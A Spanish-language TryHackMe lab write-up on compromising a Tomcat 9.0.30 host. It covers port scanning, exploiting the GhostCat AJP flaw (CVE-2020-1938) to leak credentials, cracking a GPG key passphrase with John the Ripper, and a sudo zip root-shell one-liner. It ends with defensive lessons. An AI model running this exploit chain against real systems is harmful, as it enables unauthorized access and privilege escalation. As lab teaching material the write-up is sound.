**Dificultad:** Easy  
**Plataforma:** TryHackMe  
**CVE principal:** CVE-2020-1938 (Apache Tomcat AJP — GhostCat)  
**Técnicas:** LFI via AJP · Cracking de clave GPG · Escalada de privilegios con zip (GTFOBins)

---
## Índice

1. [Reconocimiento](#1-reconocimiento)
2. [Enumeración de servicios](#2-enumeración-de-servicios)
3. [Explotación — CVE-2020-1938 GhostCat](#3-explotación--cve-2020-1938-ghostcat)
4. [Acceso inicial](#4-acceso-inicial)
5. [Post-explotación — Cracking GPG](#5-post-explotación--cracking-gpg)
6. [Escalada de privilegios](#6-escalada-de-privilegios)
7. [Conclusión](#7-conclusión)

---
## 1. Reconocimiento

Se realiza un escaneo SYN rápido sobre todos los puertos para descubrir cuáles están abiertos:
```
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.130.165.80 -oG scan.txt
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-05-16 09:50 UTC
Initiating SYN Stealth Scan at 09:50
Scanning 10.130.165.80 [65535 ports]
Discovered open port 22/tcp on 10.130.165.80
Discovered open port 8080/tcp on 10.130.165.80
Discovered open port 53/tcp on 10.130.165.80
Discovered open port 8009/tcp on 10.130.165.80
Completed SYN Stealth Scan at 09:51, 10.24s elapsed (65535 total ports)
Nmap scan report for 10.130.165.80
Host is up, received user-set (0.030s latency).
Scanned at 2026-05-16 09:50:59 UTC for 10s
Not shown: 65531 closed tcp ports (reset)
PORT     STATE SERVICE    REASON
22/tcp   open  ssh        syn-ack ttl 62
53/tcp   open  domain     syn-ack ttl 62
8009/tcp open  ajp13      syn-ack ttl 62
8080/tcp open  http-proxy syn-ack ttl 62

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 10.41 seconds
           Raw packets sent: 65535 (2.884MB) | Rcvd: 65535 (2.621MB)
```
Se identifican 4 puertos abiertos. El puerto **8009** llama la atención: corresponde al protocolo **AJP (Apache JServ Protocol)**, habitualmente asociado a Apache Tomcat.

---
## 2. Enumeración de servicios

Se lanza un segundo escaneo para detectar versiones y ejecutar scripts básicos de Nmap:

```
nmap -p22,53,8009,8080 -sCV 10.130.165.80 -oG ports.txt
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-05-16 09:56 UTC
Nmap scan report for 10.130.165.80
Host is up (0.028s latency).

PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 f3:c8:9f:0b:6a:c5:fe:95:54:0b:e9:e3:ba:93:db:7c (RSA)
|   256 dd:1a:09:f5:99:63:a3:43:0d:2d:90:d8:e3:e1:1f:b9 (ECDSA)
|_  256 48:d1:30:1b:38:6c:c6:53:ea:30:81:80:5d:0c:f1:05 (ED25519)
53/tcp   open  tcpwrapped
8009/tcp open  ajp13      Apache Jserv (Protocol v1.3)
| ajp-methods: 
|_  Supported methods: GET HEAD POST OPTIONS
8080/tcp open  http       Apache Tomcat 9.0.30
|_http-favicon: Apache Tomcat
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Apache Tomcat/9.0.30
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.06 seconds
```

**Resultados relevantes:**

```
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8
8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
8080/tcp open  http    Apache Tomcat 9.0.30
```
La versión de Tomcat es la **9.0.30**, anterior a la versión parcheada (9.0.31). Esto la hace vulnerable a **CVE-2020-1938**.
### ¿Qué es AJP?

AJP es un protocolo de red. Es una versión optimizada del protocolo HTTP para permitir que un servidor web independiente como Apache se comunique con Tomcat. Históricamente, Apache ha sido mucho más rápido que Tomcat al servir contenido estático. La idea es permitir que Apache sirva el contenido estático cuando sea posible, pero proxy la solicitud a Tomcat para el contenido relacionado con Tomcat.
Puerto por defecto: 8009.

---
## 3. Explotación — CVE-2020-1938 GhostCat

Esta es una vulnerabilidad LFI que permite obtener algunos archivos como WEB-INF/web.xml que contiene credenciales. Este es un [exploit](https://github.com/Hancheng-Lei/Hacking-Vulnerability-CVE-2020-1938-Ghostcat/tree/main) para abusar de la vulnerabilidad y los puertos expuestos AJP podrían ser vulnerables a ella.

Las versiones corregidas son 9.0.31 o superiores, 8.5.51, y 7.0.100.

``` bash
python CVE-2020-1938.py -f WEB-INF/web.xml 10.130.165.80 -p 8009 > result.txt
```

**Contenido obtenido:**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<web-app ...>
  <display-name>Welcome to Tomcat</display-name>
  <description>
     Welcome to GhostCat
    skyfuck:8730281lkjlkjdqlksalks
  </description>
</web-app>
```

El fichero `web.xml` contiene credenciales en texto claro: `skyfuck:8730281lkjlkjdqlksalks`.

---
## 4. Acceso inicial

Con las credenciales obtenidas se accede por SSH:

```bash
ssh skyfuck@10.130.165.80
```


En el directorio home del usuario se encuentran dos archivos de interés:

```
tryhackme.asc
tryhackme.pgp
```

Se traen a la máquina atacante para analizarlos:
```bash
scp 'skyfuck@10.130.165.80:/home/skyfuck/*.*' ./
```

---
## 5. Post-explotación — Cracking GPG

El archivo `.asc` es una clave privada GPG cifrada con passphrase. Se extrae el hash con `gpg2john` y se crackea con John the Ripper:

```bash
gpg2john tryhackme.asc > hash
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```

**Resultado:**

```
alexandru        (tryhackme)
1g 0:00:00:00 DONE (2026-05-16 10:34)
```

La passphrase es `alexandru`. Con ella se descifra el archivo PGP:

```bash
gpg --import tryhackme.asc
gpg --decrypt tryhackme.pgp
```

El archivo descifrado revela las credenciales del usuario **merlin**, con las que se accede al sistema:

```bash
ssh merlin@10.130.165.80
```

---
## 6. Escalada de privilegios

Se comprueba qué comandos puede ejecutar `merlin` con privilegios de root:

```bash
sudo -l
```

El usuario puede ejecutar `zip` como root sin contraseña. Consultando [GTFOBins](https://gtfobins.github.io/gtfobins/zip/), se construye el siguiente exploit:

```bash
TF=$(mktemp -u)
sudo zip $TF /etc/hosts -T -TT 'sh #'
sudo rm $TF
```

Esto lanza una shell como **root**, completando la escalada de privilegios y la máquina.

---
## 7. Conclusión

| Fase | Técnica | Herramienta |
|---|---|---|
| Reconocimiento | SYN Scan | Nmap |
| Explotación | LFI via AJP (CVE-2020-1938) | CVE-2020-1938.py |
| Cracking | Hash GPG | gpg2john + John |
| Escalada | sudo zip (GTFOBins) | zip |
### Lecciones aprendidas

- El protocolo AJP **no debería estar expuesto públicamente**. En entornos productivos debe restringirse a localhost o deshabilitarse si no se utiliza.
- Mantener Tomcat actualizado es crítico: una versión de diferencia (9.0.30 vs 9.0.31) separaba este sistema de la vulnerabilidad.
- Las credenciales nunca deben almacenarse en texto claro dentro de ficheros de configuración como `web.xml`.
- Los permisos `sudo` sobre utilidades como `zip`, `tar` o `python` pueden ser aprovechados fácilmente para escalar privilegios.

---

*Writeup realizado con fines educativos en un entorno controlado de TryHackMe.*
